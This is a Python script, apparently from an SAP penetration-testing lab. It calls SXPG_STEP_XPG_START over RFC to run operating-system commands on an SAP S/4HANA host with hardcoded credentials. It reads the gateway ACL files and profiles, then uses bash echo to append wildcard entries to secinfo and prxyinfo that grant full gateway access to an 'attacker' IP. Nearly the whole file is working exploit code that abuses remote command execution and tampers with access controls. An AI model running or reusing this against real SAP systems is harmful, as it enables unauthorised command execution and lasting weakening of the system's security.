#!/usr/bin/env python3
"""
test_rfc_diag5.py — Read secinfo/prxyinfo ACL files + patch them.
"""
import sys
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')
from sap_rfc_ctypes import RFCConnection

SDK_PATH = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'
HOST='192.168.2.209'; SYSNR='00'; CLIENT='001'; USER='joris'; PASSWD='SccAdmin123!'
ATT_IP='192.168.2.210'

BASE = dict(TARGET="", DESTINATION="", STDINCNTL="R", STDOUTCNTL="M",
            STDERRCNTL="M", TRACECNTL="0", TERMCNTL="C", TRACELEVEL="0",
            LONG_PARAMS="", CONNCNTL="H")

def sxpg(conn, prog, params, label, loud=True):
    if loud:
        print(f"\n[CMD] {label}")
        print(f"  {prog} {params}")
    kw = dict(BASE, EXTPROG=prog, PARAMS=params)
    try:
        try:   r = conn.call("SXPG_STEP_XPG_START", MXROW=9999, **kw)
        except Exception as e:
            if "MXROW" in str(e) or "RFC_INVALID" in str(e):
                r = conn.call("SXPG_STEP_XPG_START", **kw)
            else:
                if loud: print(f"  ERROR: {e}")
                return None
    except Exception as e:
        if loud: print(f"  ERROR: {e}")
        return None
    if loud:
        for row in r.get("LOG", []):
            line = (row.get("MESSAGE") or row.get("LINE") or row.get("TEXT") or "") if isinstance(row, dict) else str(row)
            line = line.rstrip()
            if line: print(f"  {line}")
        print(f"  [exit={r.get('STATUS','?')!r}]")
    return r

def main():
    print(f"[*] Connecting...")
    with RFCConnection(sdk_path=SDK_PATH, ashost=HOST, sysnr=SYSNR,
                       client=CLIENT, user=USER, passwd=PASSWD, lang="EN") as conn:
        print("[+] OK\n")

        # Read the secinfo file
        sxpg(conn, "/usr/bin/cat",
             "/usr/sap/S4H/SYS/global/secinfo",
             "Read secinfo ACL file")

        # Find prxyinfo file (proxy ACL)
        sxpg(conn, "/usr/bin/find",
             "/usr/sap/S4H/SYS/global/ -name prxyinfo",
             "Find prxyinfo file")

        # Find any ACL files in global dir
        sxpg(conn, "/bin/ls",
             "-la /usr/sap/S4H/SYS/global/",
             "List global dir (ACL files)")

        # Read the DEFAULT.PFL gw params to confirm what's active
        sxpg(conn, "/usr/bin/grep",
             "gw/ /usr/sap/S4H/SYS/profile/DEFAULT.PFL",
             "Active DEFAULT.PFL GW params")

        # Also read the instance profile
        sxpg(conn, "/usr/bin/cat",
             "/usr/sap/S4H/SYS/profile/S4H_D00_s4hanadev",
             "Full D00 instance profile")

        # Try to write a permissive prxyinfo entry for our IP
        # prxyinfo format: P TP=<tp> HOST=<client_host> PORT=<gw_port> ACCESS=<target_system> ID=*
        # We want: P TP=* HOST=192.168.2.210 PORT=* ACCESS=* ID=*
        print("\n[*] Adding our IP to prxyinfo ACL...")
        sxpg(conn, "/bin/bash",
             f"-c echo 'P TP=* HOST={ATT_IP} PORT=* ACCESS=* ID=*' >> /usr/sap/S4H/SYS/global/prxyinfo",
             "Append to prxyinfo (bash echo)")

        # Write a permissive secinfo as well
        print("\n[*] Checking/writing secinfo...")
        sxpg(conn, "/bin/bash",
             f"-c echo 'P TP=* HOST={ATT_IP} ACCESS=*' >> /usr/sap/S4H/SYS/global/secinfo",
             "Append to secinfo (bash echo)")

        # Try using tee to write
        sxpg(conn, "/usr/bin/tee",
             f"-a /usr/sap/S4H/SYS/global/prxyinfo",
             "Write to prxyinfo via tee (no-op if no stdin)")

        print("\n[*] Done.")

if __name__ == '__main__':
    main()
